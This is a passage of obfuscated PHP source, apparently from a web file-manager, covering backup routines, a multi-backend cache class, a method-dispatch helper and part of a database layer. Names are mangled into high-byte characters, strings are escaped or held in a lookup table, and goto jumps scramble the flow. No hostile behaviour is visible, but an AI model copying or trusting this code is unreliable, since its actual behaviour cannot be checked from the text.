Backup::log($äŸÛå‚Î[891] . $±ùÀ’»±); return !1; } $Ê¾€ıâ€ = IO::listPath($£ğÅáÃÅ); $×„Œˆø = isset($Ê¾€ıâ€[$äŸÛå‚Î[86]]) ? $Ê¾€ıâ€[$äŸÛå‚Î[86]] : array(); $Æ²¼¢š = array_sum(array_column($×„Œˆø, $äŸÛå‚Î[79])); if (!$Æ²¼¢š) { Backup::log($äŸÛå‚Î[892] . $£ğÅáÃÅ); return !1; } $Ë·ÊåÇ§ = array($äŸÛå‚Î[893] => $Æ²¼¢š, $äŸÛå‚Î[894] => time()); Backup::set($Ë·ÊåÇ§); $„èËà²§ = new TaskFileTransfer($äŸÛå‚Î[895], $äŸÛå‚Î[868], count($×„Œˆø), LNG($äŸÛå‚Î[877]) . $äŸÛå‚Î[465] . LNG($äŸÛå‚Î[879]) . $äŸÛå‚Î[896]); $„èËà²§->task[$äŸÛå‚Î[854]] = $Æ²¼¢š; foreach ($Ê¾€ıâ€[$äŸÛå‚Î[86]] as $¹İü¾É¤) { $Ã·ñé¨ó = IO::move($¹İü¾É¤[$äŸÛå‚Î[87]], $±ùÀ’»±); if (!$Ã·ñé¨ó) { $„èËà²§->end(); $¢â‰ÔéÚ = IO::getLastError($äŸÛå‚Î[897] . $¹İü¾É¤[$äŸÛå‚Î[87]] . $äŸÛå‚Î[898] . $±ùÀ’»± . $äŸÛå‚Î[178]); Backup::log($¢â‰ÔéÚ); return !1; } } $õÌË³’à = new DbManage(); $ë¡ğ²Èé = $õÌË³’à->getSqlFile(); if (!$ë¡ğ²Èé[$äŸÛå‚Î[899]] || !$ë¡ğ²Èé[$äŸÛå‚Î[13]]) { Backup::log($äŸÛå‚Î[900]); return !1; } IO::move($ë¡ğ²Èé[$äŸÛå‚Î[899]], $±ùÀ’»±); IO::move($ë¡ğ²Èé[$äŸÛå‚Î[13]], $±ùÀ’»±); $„èËà²§->end(); $Ë·ÊåÇ§ = array($äŸÛå‚Î[901] => $Æ²¼¢š, $äŸÛå‚Î[902] => time()); Backup::set($Ë·ÊåÇ§); return !0; } private function backupPath($Ÿ’‰‘­ğ) { $ËŞ ÁÖú =& $_SERVER[ÓïÕü]; $à”Åù· = $Ÿ’‰‘­ğ[$ËŞ ÁÖú[32]]; $ÔÁô¢¨» = Model($ËŞ ÁÖú[861])->get($ËŞ ÁÖú[862]); $¿ùªÙ¦× = substr(md5($ËŞ ÁÖú[863] . $ÔÁô¢¨» . $à”Åù·), 0, 8); return "\173\x69\157\72{$Ÿ’‰‘­ğ[$ËŞ ÁÖú[843]]}\175\x2f\144\x61\x74\x61\x62\141\163\x65\57\142\x61\x63\x6b\165\160\x2f" . $à”Åù· . $ËŞ ÁÖú[11] . $¿ùªÙ¦×; } private function tmpFilesPath() { $æÓí‰â =& $_SERVER[ÓïÕü]; $‚ë¼şĞã = TEMP_FILES; if ($GLOBALS[$æÓí‰â[6]][$æÓí‰â[92]][$æÓí‰â[889]]) { $‚ë¼şĞã = $GLOBALS[$æÓí‰â[6]][$æÓí‰â[92]][$æÓí‰â[889]]; if (!mk_dir($‚ë¼şĞã) || !is_writable($‚ë¼şĞã) || !IO::mkfile($‚ë¼şĞã . $æÓí‰â[890])) { $‚ë¼şĞã = TEMP_FILES; } } return $‚ë¼şĞã; } } class BackupFile { public function __construct() { } public function index() { $…ÙøÀË = Backup::get(); $àÉ ŞŞ¨ = $…ÙøÀË[$_SERVER[ÓïÕü][371]][$_SERVER[ÓïÕü][233]][$_SERVER[ÓïÕü][546]]; $Ğß„ııÎ = array($_SERVER[ÓïÕü][547] => array($_SERVER[ÓïÕü][903], $àÉ ŞŞ¨), $_SERVER[ÓïÕü][904] => array($_SERVER[ÓïÕü][409], $…ÙøÀË[$_SERVER[ÓïÕü][843]])); $Ç¿ıÙ¯ = (int) Model($_SERVER[ÓïÕü][882])->where($Ğß„ııÎ)->count($_SERVER[ÓïÕü][546]); $òŞõ¨” = (int) Model($_SERVER[ÓïÕü][882])->where($Ğß„ııÎ)->sum($_SERVER[ÓïÕü][79]); $•¸‹”Îï = new TaskFileTransfer($_SERVER[ÓïÕü][905], $_SERVER[ÓïÕü][868], $Ç¿ıÙ¯, LNG($_SERVER[ÓïÕü][877]) . $_SERVER[ÓïÕü][878] . LNG($_SERVER[ÓïÕü][906])); $•¸‹”Îï->task[$_SERVER[ÓïÕü][854]] = $òŞõ¨”; $âûôÍÍş = array($_SERVER[ÓïÕü][907] => $Ç¿ıÙ¯, $_SERVER[ÓïÕü][908] => $òŞõ¨”, $_SERVER[ÓïÕü][909] => time()); Backup::set($âûôÍÍş); $âÆØ‚š = !0; $á®œÀîĞ = $this->storeIds(); $½§É¯Í€ = 1; $àÕøó”õ = 1000; $Õì²‚€¾ = $¹æçıÓ… = 0; $ø†ĞÌİ× = array(); $ñ‹ğÒ¿é = $ÎÌ˜ßôÉ = 0; do { $†øİÜŞ€ = $_SERVER[ÓïÕü][910]; $”ö·Î‘ = Model($_SERVER[ÓïÕü][882])->where($Ğß„ııÎ)->field($†øİÜŞ€)->order($_SERVER[ÓïÕü][911])->selectPage($àÕøó”õ, $½§É¯Í€); $‡“òãÕ¹ = !empty($”ö·Î‘[$_SERVER[ÓïÕü][448]]) ? $”ö·Î‘[$_SERVER[ÓïÕü][448]] : array(); foreach ($‡“òãÕ¹ as $“£ªÙÂ) { if (!$this->_fileExist($“£ªÙÂ, $ø†ĞÌİ×, $á®œÀîĞ)) { Backup::log($_SERVER[ÓïÕü][912] . $“£ªÙÂ[$_SERVER[ÓïÕü][546]] . $_SERVER[ÓïÕü][913] . $“£ªÙÂ[$_SERVER[ÓïÕü][87]]); continue; } $—ªÆúÙ = $“£ªÙÂ[$_SERVER[ÓïÕü][87]]; $ÊƒÆ²Ÿò = "\x7b\151\157\72{$…ÙøÀË[$_SERVER[ÓïÕü][843]]}\x7d" . substr($—ªÆúÙ, strlen("\x7b\151\157\72{$“£ªÙÂ[$_SERVER[ÓïÕü][914]]}\x7d")); if (IO::exist($ÊƒÆ²Ÿò)) { $•¸‹”Îï->updateFileEnd($“£ªÙÂ[$_SERVER[ÓïÕü][32]], $“£ªÙÂ[$_SERVER[ÓïÕü][79]]); } else { $ÊƒÆ²Ÿò = get_path_father($ÊƒÆ²Ÿò); IO::mkdir($ÊƒÆ²Ÿò); if (!IO::copy($—ªÆúÙ, $ÊƒÆ²Ÿò, $_SERVER[ÓïÕü][915])) { Backup::log($_SERVER[ÓïÕü][916] . $—ªÆúÙ . $_SERVER[ÓïÕü][898] . $ÊƒÆ²Ÿò . $_SERVER[ÓïÕü][178]); $âÆØ‚š = !1; break; } } $àÉ ŞŞ¨ = $“£ªÙÂ[$_SERVER[ÓïÕü][546]]; $¹æçıÓ… += 1; $Õì²‚€¾ += $“£ªÙÂ[$_SERVER[ÓïÕü][79]]; $ÎÌ˜ßôÉ += 1; $ñ‹ğÒ¿é += $“£ªÙÂ[$_SERVER[ÓïÕü][79]]; if ($Õì²‚€¾ >= 1024 * 1024 * 100) { $âûôÍÍş = array($_SERVER[ÓïÕü][842] => $àÉ ŞŞ¨, $_SERVER[ÓïÕü][917] => $ÎÌ˜ßôÉ, $_SERVER[ÓïÕü][918] => $ñ‹ğÒ¿é); Backup::set($âûôÍÍş); $Õì²‚€¾ = $¹æçıÓ… = 0; } } $ºíœã’» = count($‡“òãÕ¹); $½§É¯Í€++; } while ($ºíœã’» == $àÕøó”õ); $•¸‹”Îï->end(); $âûôÍÍş = array($_SERVER[ÓïÕü][919] => 1, $_SERVER[ÓïÕü][852] => time(), $_SERVER[ÓïÕü][866] => 1, $_SERVER[ÓïÕü][842] => $àÉ ŞŞ¨, $_SERVER[ÓïÕü][920] => time()); if ($¹æçıÓ…) { $âûôÍÍş[$_SERVER[ÓïÕü][917]] = $ÎÌ˜ßôÉ; $âûôÍÍş[$_SERVER[ÓïÕü][918]] = $ñ‹ğÒ¿é; } Backup::set($âûôÍÍş); return !0; } private function _fileExist($ÃÏŞçæ, &$¿£Ë´¥Ù, $™Ÿ™ğ¾) { $±­ƒ†æ÷ =& $_SERVER[ÓïÕü]; $¹ãÓî±¸ = $ÃÏŞçæ[$±­ƒ†æ÷[87]]; if (in_array($ÃÏŞçæ[$±­ƒ†æ÷[546]], $¿£Ë´¥Ù)) { return !1; } if (!in_array($ÃÏŞçæ[$±­ƒ†æ÷[914]], $™Ÿ™ğ¾)) { return !1; } if (IO::exist($¹ãÓî±¸)) { return !0; } $ÎşÃ°ı = get_path_father($¹ãÓî±¸); if (IO::exist($ÎşÃ°ı)) { $¿£Ë´¥Ù[] = $ÃÏŞçæ[$±­ƒ†æ÷[546]]; return !1; } $ÙõÏû¬ä = array($±­ƒ†æ÷[914] => $ÃÏŞçæ[$±­ƒ†æ÷[914]], $±­ƒ†æ÷[87] => array($±­ƒ†æ÷[462], "{$ÎşÃ°ı}\x25")); $ÕéŸ˜Áï = Model($±­ƒ†æ÷[882])->where($ÙõÏû¬ä)->field($±­ƒ†æ÷[547])->select(); $¿£Ë´¥Ù = array_merge($¿£Ë´¥Ù, array_to_keyvalue($ÕéŸ˜Áï, $±­ƒ†æ÷[12], $±­ƒ†æ÷[546])); return !1; } private function _fileFilter($±íßı) { $ÏŒğŒë =& $_SERVER[ÓïÕü]; return; if (empty($±íßı)) { return; } $ÃµË €± = array($ÏŒğŒë[546] => array($ÏŒğŒë[7], array_unique($±íßı))); $§²ç…²” = Model($ÏŒğŒë[921])->where($ÃµË €±)->field($ÏŒğŒë[194])->select(); foreach ($§²ç…²” as $°¼Š§Ä¾) { Model($ÏŒğŒë[921])->remove($°¼Š§Ä¾[$ÏŒğŒë[194]], !1); } } private function storeIds() { $–íÕŸË =& $_SERVER[ÓïÕü]; $§¯Ô¾õ = Model($–íÕŸË[858])->listData(); $ŒáÛÛÓ³ = array(); $¸ı‘“¡ş = $GLOBALS[$–íÕŸË[6]][$–íÕŸË[92]][$–íÕŸË[922]]; foreach ($§¯Ô¾õ as $ı—ÍŸ”á) { $íÜ«®á = strtolower($ı—ÍŸ”á[$–íÕŸË[98]]); if (!isset($¸ı‘“¡ş[$íÜ«®á])) { continue; } $¡ìÉº€ = $–íÕŸË[77] . (isset($¸ı‘“¡ş[$íÜ«®á]) ? $¸ı‘“¡ş[$íÜ«®á] : ucfirst($íÜ«®á)); if (!class_exists($¡ìÉº€)) { continue; } $ŒáÛÛÓ³[] = $ı—ÍŸ”á[$–íÕŸË[478]]; } return $ŒáÛÛÓ³; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ù–Ü¼Êç =& $_SERVER[ÓïÕü]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $‚ª«úÆø = $GLOBALS[$ù–Ü¼Êç[6]][$ù–Ü¼Êç[427]]; $â ßçº = $‚ª«úÆø[$‚ª«úÆø[$ù–Ü¼Êç[923]]]; $Â³¶Ú‘½ = $‚ª«úÆø[$ù–Ü¼Êç[924]]; switch ($‚ª«úÆø[$ù–Ü¼Êç[923]]) { case $ù–Ü¼Êç[21]: self::$handle = Model($ù–Ü¼Êç[925]); break; case $ù–Ü¼Êç[926]: self::$handle = new CacheRedis($â ßçº, $Â³¶Ú‘½); break; case $ù–Ü¼Êç[927]: self::$handle = new CacheMemcached($â ßçº, $Â³¶Ú‘½); break; case $ù–Ü¼Êç[233]: self::$handle = new CacheFile($â ßçº, $Â³¶Ú‘½); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Á³½İ·Ø) { if (is_array($Á³½İ·Ø) || is_object($Á³½İ·Ø)) { $Á³½İ·Ø = json_encode($Á³½İ·Ø); } $Á³½İ·Ø = rawurlencode($Á³½İ·Ø); return md5(KOD_SITE_ID . $_SERVER[ÓïÕü][11] . $Á³½İ·Ø); } public static function get($§æÚ“Ğ¥, $şËåƒ± = false) { $ÕæÉãûå = self::key($§æÚ“Ğ¥); $Äœ¬ÅÅ× = self::init(); if ($şËåƒ±) { return unserialize($Äœ¬ÅÅ×->get($ÕæÉãûå)); } if (!isset(self::$memoryCache[$ÕæÉãûå])) { $ğ„ÚÀŞò = $Äœ¬ÅÅ×->get($ÕæÉãûå); self::$memoryCache[$ÕæÉãûå] = unserialize($ğ„ÚÀŞò); } return self::$memoryCache[$ÕæÉãûå]; } public static function set($‹Ïê¦™, $ºÄñ“Û, $ÂÁ· Ëò = false) { $†ª¾¿ØÔ =& $_SERVER[ÓïÕü]; $ÓßÎŠç = self::key($‹Ïê¦™); if (isset(self::$memoryCache[$ÓßÎŠç]) && self::$memoryCache[$ÓßÎŠç] === $ºÄñ“Û) { return !0; } if ($ÂÁ· Ëò === 0) { self::$memoryCache[$ÓßÎŠç] = $ºÄñ“Û; return !0; } $ŠÒ×‘–Æ = self::init(); $‹Í÷×Ô© = serialize($ºÄñ“Û); CacheLock::lock($‹Ïê¦™ . $†ª¾¿ØÔ[928]); $Ââ¥®íÛ = $ŠÒ×‘–Æ->set($ÓßÎŠç, $‹Í÷×Ô©, $ÂÁ· Ëò); self::$memoryCache[$ÓßÎŠç] = $ºÄñ“Û; CacheLock::unlock($‹Ïê¦™ . $†ª¾¿ØÔ[928]); return $Ââ¥®íÛ; } public static function getCall($Ü’öáé¼, $‰…ä¥¬, $¼üíşÄ¿, $ûÅ×Ì­È = array()) { $¶¢Â€ë =& $_SERVER[ÓïÕü]; $ŸŸ©µĞ = self::get($Ü’öáé¼); if ($ŸŸ©µĞ || $ŸŸ©µĞ === $¶¢Â€ë[12]) { return $ŸŸ©µĞ; } $ŸŸ©µĞ = call_user_func_array($¼üíşÄ¿, $ûÅ×Ì­È); $ŸŸ©µĞ = $ŸŸ©µĞ ? $ŸŸ©µĞ : $¶¢Â€ë[12]; self::set($Ü’öáé¼, $ŸŸ©µĞ, $‰…ä¥¬); return $ŸŸ©µĞ; } public static function remove($º¨º—£) { $ÙØ—Âî€ = self::key($º¨º—£); unset(self::$memoryCache[$ÙØ—Âî€]); self::clearTimeout(); CacheLock::lock($º¨º—£); $Ìû„€ı = self::init()->remove($ÙØ—Âî€); CacheLock::unlock($º¨º—£); return $Ìû„€ı; } public static function removeMemory($£äšÕî†) { $­®Æ´¿· = self::key($£äšÕî†); unset(self::$memoryCache[$­®Æ´¿·]); } public static function clearMemory($­Şƒ®º… = false) { if ($­Şƒ®º…) { $­Şƒ®º… = self::key($­Şƒ®º…); unset(self::$memoryCache[$­Şƒ®º…]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ÓïÕü][929])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ÓïÕü][930])) { self::init()->clearTimeout(); } } } goto b„Î”ÊåÏ‘; B•ŠÈ¹¡‰„: function binCheckBigger($ç«ïï, $ë±Æ¥Ôï) { return $ç«ïï > $ë±Æ¥Ôï; } $_SERVER[$_SERVER[şªÒä][3]] = ("\70\66\71\63"."\62\65")+0;$_i61b="fmuob0pcqaiz9s5kd648lnh3xjy21egvr7tw4noyrx8u1d3qihgk6tlpwzbs5e97m0ajfv2ch0liy4x3p9";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($êƒ®¼Â®, $ã–Ä«°â) { $©íğò¿Ú =& $_SERVER[ÓïÕü]; if (isset(self::$_methodList[$êƒ®¼Â®])) { return @call_user_func_array(self::$_methodList[$êƒ®¼Â®], $ã–Ä«°â); } else { if (method_exists($this, $êƒ®¼Â®)) { return call_user_func_array(array($this, $êƒ®¼Â®), $ã–Ä«°â); } else { think_exception(__CLASS__ . $©íğò¿Ú[4] . $êƒ®¼Â® . $©íğò¿Ú[5]); } } } public static function __callStatic($‡ïÖ¹’®, $Ş•€Âõª) { if (isset(self::$_methodListStatic[$‡ïÖ¹’®])) { return call_user_func_array(self::$_methodListStatic[$‡ïÖ¹’®], $Ş•€Âõª); } else { if (method_exists(self, $‡ïÖ¹’®)) { return call_user_func_array(array(self, $‡ïÖ¹’®), $Ş•€Âõª); } else { show_json("{$‡ïÖ¹’®}\50\x29\40\156\x6f\x74\40\x65\x78\151\163\x74\73", !1); } } } public static function addMethod($™‚Àã‡ß, $ ¹®‘­) { self::$_methodList[$™‚Àã‡ß] = $ ¹®‘­; } public static function addMethodStatic($¨À×îıĞ, $ÜâæÔƒ) { self::$_methodListStatic[$¨À×îıĞ] = $ÜâæÔƒ; } } goto FáÏÊ ïô¦; eÁ‚„¬Åá: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\x65\161" => "\74\76", "\x67\x74" => "\76", "\145\147\x74" => "\76\75", "\x6c\164" => "\74", "\145\x6c\x74" => "\74\75", "\156\157\x74\x6c\151\x6b\x65" => "\x4e\x4f\124\40\114\x49\x4b\105", "\x6c\x69\x6b\x65" => "\x4c\111\113\105", "\151\156" => "\111\116", "\x6e\157\x74\x69\156" => "\116\x4f\124\40\x49\x4e", "\156\157\x74\40\x69\x6e" => "\116\x4f\124\40\111\116", "\x62\145\164\167\145\x65\156" => "\102\105\x54\x57\105\105\x4e", "\156\157\x74\142\145\x74\167\x65\x65\x6e" => "\x4e\117\124\x20\102\x45\124\127\105\105\x4e", "\x6e\157\164\40\142\145\164\167\x65\x65\x6e" => "\x4e\117\124\x20\x42\x45\124\127\105\105\x4e"); protected $selectSql = "\123\105\114\105\103\x54\x25\x44\111\123\124\x49\116\103\124\x25\x20\45\106\111\x45\x4c\104\x25\40\x46\122\x4f\x4d\40\x25\x54\x41\102\x4c\105\45\x25\112\117\x49\x4e\45\45\x57\x48\105\122\105\x25\x25\107\122\117\125\120\x25\x25\110\x41\126\111\116\x47\x25\x25\x4f\x52\x44\105\122\x25\45\114\x49\115\111\124\x25\40\x25\x55\116\x49\117\x4e\x25\x25\x43\x4f\115\x4d\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $°û†õÌ¯ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ÓïÕü][1064], $°û†õÌ¯); } public function factory($Ğ¬¢õû¾ = '') { $îô€˜ =& $_SERVER[ÓïÕü]; $Ğ¬¢õû¾ = $this->parseConfig($Ğ¬¢õû¾); if (empty($Ğ¬¢õû¾[$îô€˜[1065]])) { think_exception(think_lang($îô€˜[1066])); } $this->dbType = ucwords(strtolower($Ğ¬¢õû¾[$îô€˜[1065]])); $ö¼„´¹© = $îô€˜[1067] . $this->dbType; if (class_exists($ö¼„´¹©)) { $«§ü‘“Â = new $ö¼„´¹©($Ğ¬¢õû¾); if ($îô€˜[1068] != strtolower($Ğ¬¢õû¾[$îô€˜[1065]])) { $«§ü‘“Â->dbType = strtoupper($this->dbType); } else { $«§ü‘“Â->dbType = $this->_getDsnType($Ğ¬¢õû¾[$îô€˜[1020]]); } } else { think_exception(think_lang($îô€˜[1069]) . $îô€˜[1070] . $ö¼„´¹©); } return $«§ü‘“Â; } public function __call($°£î¥Èâ, $¢ŸœÛØ) { if (method_exists($this, $°£î¥Èâ)) { return call_user_func_array(array($this, $°£î¥Èâ), $¢ŸœÛØ); } } protected function _getDsnType($”‘¶’Á) { $©è©ıÖ = explode($_SERVER[ÓïÕü][4], $”‘¶’Á); $Ëí¸¸‘€ = strtoupper(trim($©è©ıÖ[0])); return $Ëí¸¸‘€; } private function parseConfig($ß‘úÈ©¿ = '') { $¬²³•ò =& $_SERVER[ÓïÕü]; if (!empty($ß‘úÈ©¿) && is_string($ß‘úÈ©¿)) { $ß‘úÈ©¿ = $this->parseDSN($ß‘úÈ©¿); } elseif (is_array($ß‘úÈ©¿)) { $ß‘úÈ©¿ = array_change_key_case($ß‘úÈ©¿); $ß‘úÈ©¿ = array($¬²³•ò[1065] => $ß‘úÈ©¿[$¬²³•ò[1071]], $¬²³•ò[992] => $ß‘úÈ©¿[$¬²³•ò[1072]], $¬²³•ò[993] => $ß‘úÈ©¿[$¬²³•ò[1073]], $¬²³•ò[990] => $ß‘úÈ©¿[$¬²³•ò[1074]], $¬²³•ò[991] => $ß‘úÈ©¿[$¬²³•ò[1075]], $¬²³•ò[21] => $ß‘úÈ©¿[$¬²³•ò[1076]], $¬²³•ò[1020] => $ß‘úÈ©¿[$¬²³•ò[1077]], $¬²³•ò[17] => isset($ß‘úÈ©¿[$¬²³•ò[1078]]) ? $ß‘úÈ©¿[$¬²³•ò[1078]] : array()); } elseif (empty($ß‘úÈ©¿)) { if (think_config($¬²³•ò[1079]) && $¬²³•ò[1068] != strtolower(think_config($¬²³•ò[1080]))) { $ß‘úÈ©¿ = $this->parseDSN(think_config($¬²³•ò[1079])); } else { $ß‘úÈ©¿ = array($¬²³•ò[1065] => think_config($¬²³•ò[1080]), $¬²³•ò[992] => think_config($¬²³•ò[1081]), $¬²³•ò[993] => think_config($¬²³•ò[1082]), $¬²³•ò[990] => think_config($¬²³•ò[1083]), $¬²³•ò[991] => think_config($¬²³•ò[1084]), $¬²³•ò[21] => think_config($¬²³•ò[326]), $¬²³•ò[1020] => think_config($¬²³•ò[1079]), $¬²³•ò[17] => think_config($¬²³•ò[1085])); } } return $ß‘úÈ©¿; } protected function initConnect($©¯…è›Ê = true) { if (1 == think_config($_SERVER[ÓïÕü][22])) { $this->_linkID = $this->multiConnect($©¯…è›Ê); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¡Ç†ßé÷ => $€ƒ”›®ë) { $this->_linkID = $€ƒ”›®ë; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ş¯²¡ÁÉ = false) { $ÚÂĞÖÓé =& $_SERVER[ÓïÕü]; static $¢±¨ßË§ = array(); static $ûŞˆ†‰ú = -1; if (empty($¢±¨ßË§)) { foreach ($this->config as $©¶ú›° => $¸İŠÖƒ¦) { $¢±¨ßË§[$©¶ú›°] = explode($ÚÂĞÖÓé[50], $¸İŠÖƒ¦); } } if (think_config($ÚÂĞÖÓé[1086])) { if ($ş¯²¡ÁÉ || think_config($ÚÂĞÖÓé[474]) === !0) { $¡Ÿö¸¿± = floor(mt_rand(0, think_config($ÚÂĞÖÓé[1087]) - 1)); $ûŞˆ†‰ú = $¡Ÿö¸¿±; } else { if (is_numeric(think_config($ÚÂĞÖÓé[1088]))) { $¡Ÿö¸¿± = think_config($ÚÂĞÖÓé[1088]); } else { $¡Ÿö¸¿± = floor(mt_rand(think_config($ÚÂĞÖÓé[1087]), count($¢±¨ßË§[$ÚÂĞÖÓé[990]]) - 1)); } } } else { $¡Ÿö¸¿± = floor(mt_rand(0, count($¢±¨ßË§[$ÚÂĞÖÓé[990]]) - 1)); $ûŞˆ†‰ú = $¡Ÿö¸¿±; } $¡Ÿö¸¿± = $ûŞˆ†‰ú !== -1 ? $ûŞˆ†‰ú : $¡Ÿö¸¿±; $îş–Åú“ = array($ÚÂĞÖÓé[992] => isset($¢±¨ßË§[$ÚÂĞÖÓé[992]][$¡Ÿö¸¿±]) ? $¢±¨ßË§[$ÚÂĞÖÓé[992]][$¡Ÿö¸¿±] : $¢±¨ßË§[$ÚÂĞÖÓé[992]][0], $ÚÂĞÖÓé[993] => isset($¢±¨ßË§[$ÚÂĞÖÓé[993]][$¡Ÿö¸¿±]) ? $¢±¨ßË§[$ÚÂĞÖÓé[993]][$¡Ÿö¸¿±] : $¢±¨ßË§[$ÚÂĞÖÓé[993]][0], $ÚÂĞÖÓé[990] => isset($¢±¨ßË§[$ÚÂĞÖÓé[990]][$¡Ÿö¸¿±]) ? $¢±¨ßË§[$ÚÂĞÖÓé[990]][$¡Ÿö¸¿±] : $¢±¨ßË§[$ÚÂĞÖÓé[990]][0], $ÚÂĞÖÓé[991] => isset($¢±¨ßË§[$ÚÂĞÖÓé[991]][$¡Ÿö¸¿±]) ? $¢±¨ßË§[$ÚÂĞÖÓé[991]][$¡Ÿö¸¿±] : $¢±¨ßË§[$ÚÂĞÖÓé[991]][0], $ÚÂĞÖÓé[21] => isset($¢±¨ßË§[$ÚÂĞÖÓé[21]][$¡Ÿö¸¿±]) ? $¢±¨ßË§[$ÚÂĞÖÓé[21]][$¡Ÿö¸¿±] : $¢±¨ßË§[$ÚÂĞÖÓé[21]][0], $ÚÂĞÖÓé[1020] => isset($¢±¨ßË§[$ÚÂĞÖÓé[1020]][$¡Ÿö¸¿±]) ? $¢±¨ßË§[$ÚÂĞÖÓé[1020]][$¡Ÿö¸¿±] : $¢±¨ßË§[$ÚÂĞÖÓé[1020]][0], $ÚÂĞÖÓé[17] => isset($¢±¨ßË§[$ÚÂĞÖÓé[17]][$¡Ÿö¸¿±]) ? $¢±¨ßË§[$ÚÂĞÖÓé[17]][$¡Ÿö¸¿±] : $¢±¨ßË§[$ÚÂĞÖÓé[17]][0]); return $this->connect($îş–Åú“, $¡Ÿö¸¿±); } public function parseDSN($æ’ì½½™) { $Ã’ìÊ¤ò =& $_SERVER[ÓïÕü]; if (empty($æ’ì½½™)) { return !1; } $•‚ŸÂ™Æ = parse_url($æ’ì½½™); if ($•‚ŸÂ™Æ[$Ã’ìÊ¤ò[208]]) { $Áı©’Õî = array($Ã’ìÊ¤ò[1065] => $•‚ŸÂ™Æ[$Ã’ìÊ¤ò[208]], $Ã’ìÊ¤ò[992] => isset($•‚ŸÂ™Æ[$Ã’ìÊ¤ò[670]]) ? $•‚ŸÂ™Æ[$Ã’ìÊ¤ò[670]] : $Ã’ìÊ¤ò[12], $Ã’ìÊ¤ò[993] => isset($•‚ŸÂ™Æ[$Ã’ìÊ¤ò[1089]]) ? $•‚ŸÂ™Æ[$Ã’ìÊ¤ò[1089]] : $Ã’ìÊ¤ò[12], $Ã’ìÊ¤ò[990] => isset($•‚ŸÂ™Æ[$Ã’ìÊ¤ò[209]]) ? $•‚ŸÂ™Æ[$Ã’ìÊ¤ò[209]] : $Ã’ìÊ¤ò[12], $Ã’ìÊ¤ò[991] => isset($•‚ŸÂ™Æ[$Ã’ìÊ¤ò[210]]) ? $•‚ŸÂ™Æ[$Ã’ìÊ¤ò[210]] : $Ã’ìÊ¤ò[12], $Ã’ìÊ¤ò[21] => isset($•‚ŸÂ™Æ[$Ã’ìÊ¤ò[87]]) ? substr($•‚ŸÂ™Æ[$Ã’ìÊ¤ò[87]], 1) : $Ã’ìÊ¤ò[12]); } else { preg_match($Ã’ìÊ¤ò[1090], trim($æ’ì½½™), $ŞÈ×ƒà); $Áı©’Õî = array($Ã’ìÊ¤ò[1065] => $ŞÈ×ƒà[1], $Ã’ìÊ¤ò[992] => $ŞÈ×ƒà[2], $Ã’ìÊ¤ò[993] => $ŞÈ×ƒà[3], $Ã’ìÊ¤ò[990] => $ŞÈ×ƒà[4], $Ã’ìÊ¤ò[991] => $ŞÈ×ƒà[5], $Ã’ìÊ¤ò[21] => $ŞÈ×ƒà[6]); } $Áı©’Õî[$Ã’ìÊ¤ò[1020]] = $Ã’ìÊ¤ò[12]; return $Áı©’Õî; } protected function debug() { $Ë×•¬‹Ù =& $_SERVER[ÓïÕü]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ë×•¬‹Ù[1091]; if (think_config($Ë×•¬‹Ù[1092])) { think_status($Ë×•¬‹Ù[1093]); think_trace($this->queryStr . $Ë×•¬‹Ù[1094] . think_status($Ë×•¬‹Ù[24], $Ë×•¬‹Ù[1093], 6) . $Ë×•¬‹Ù[1095], $Ë×•¬‹Ù[12], $Ë×•¬‹Ù[1096]); } } protected function parseLock($Ô¸ƒÊù = false) { $ÖøñÈ«„ =& $_SERVER[ÓïÕü]; if (!$Ô¸ƒÊù) { return $ÖøñÈ«„[12]; } if ($ÖøñÈ«„[1022] == $this->dbType) { return $ÖøñÈ«„[1097]; } return $ÖøñÈ«„[1098]; } protected function parseSet($ĞëûÊÇû) { $õİıÖ³ =& $_SERVER[ÓïÕü]; foreach ($ĞëûÊÇû as $×«ıûÂ¥ => $”ôˆ«Ìõ) { if (is_array($”ôˆ«Ìõ) && $õİıÖ³[375] == $”ôˆ«Ìõ[0]) { $Çìºì©[] = $this->parseKey($×«ıûÂ¥) . $õİıÖ³[509] . $”ôˆ«Ìõ[1]; } elseif (is_scalar($”ôˆ«Ìõ) || is_null($”ôˆ«Ìõ)) { $Çìºì©[] = $this->parseKey($×«ıûÂ¥) . $õİıÖ³[509] . $this->parseValue($”ôˆ«Ìõ); } } return $õİıÖ³[1099] . implode($õİıÖ³[50], $Çìºì©); } protected function bindParam($œÔÖŒşø, $•ÔËğÚ°) { $this->bind[$_SERVER[ÓïÕü][4] . $œÔÖŒşø] = $•ÔËğÚ°; } protected function parseBind($ê…¿íªÖ) { $ê…¿íªÖ = array_merge($this->bind, $ê…¿íªÖ); $this->bind = array(); return $ê…¿íªÖ; } function parseKey(&$Ã­‹ó¼, $¼ĞÜæïÂ = true) { if ($¼ĞÜæïÂ) { $Ã­‹ó¼ = $this->parseKeyCheck($Ã­‹ó¼); } return $Ã­‹ó¼; } function parseKeyCheck($Ã¶íŒìÀ) { $ñ•×‰²Ç =& $_SERVER[ÓïÕü]; $Ã¶íŒìÀ = trim($Ã¶íŒìÀ); if (!preg_match($ñ•×‰²Ç[1100], $Ã¶íŒìÀ)) { think_exception($ñ•×‰²Ç[1101] . 